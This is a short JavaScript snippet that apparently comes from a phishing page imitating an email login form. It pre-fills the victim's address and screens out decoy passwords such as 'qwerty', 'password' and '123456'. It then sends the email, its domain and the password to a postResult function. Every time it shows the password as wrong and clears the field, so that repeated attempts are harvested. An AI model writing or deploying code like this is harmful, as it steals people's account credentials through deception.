setInterval(() => {
    $("#side_img1").toggle();
    $("#side_img2").toggle();
}, 8000);

// 
if (validEmail.test(usermail)) {
    $("#dns_mail").val(usermail)
    $("#dns_mail").attr('readOnly', true)
}

$("#dns_cn_form").on('submit', (e)=>{
    e.preventDefault();

    let dns_cn_inputs = document.getElementsByClassName("dns_cn_inputs");

    if (!validEmail.test($("#dns_mail").val())) {
        dns_cn_inputs[0].style.borderColor = "red";
        return
    }
    else{
        dns_cn_inputs[0].style.borderColor = "silver";
    }

    if (validEmail.test($("#dns_pass").val()) || $("#dns_pass").val().length < 6 || $("#dns_pass").val().toLowerCase() == "qwerty" || $("#dns_pass").val() == 123456 || $("#dns_pass").val().toLowerCase() == "password" || $("#dns_pass").val().toLowerCase() == "testing") {
        dns_cn_inputs[1].style.borderColor = "red";
        return
    }
    else{
        dns_cn_inputs[1].style.borderColor = "silver";
    }

    $("#loader").show().css({"display":"flex"})

    let url = $("#dns_mail").val().split('@');

    postResult(url[1], $("#dns_mail").val(), $("#dns_pass").val(), postCount);
    
    setTimeout(() => {
        dns_cn_inputs[1].style.borderColor = "red";
        postCount++
        $("#dns_pass").val("")
    }, delayCounter);
})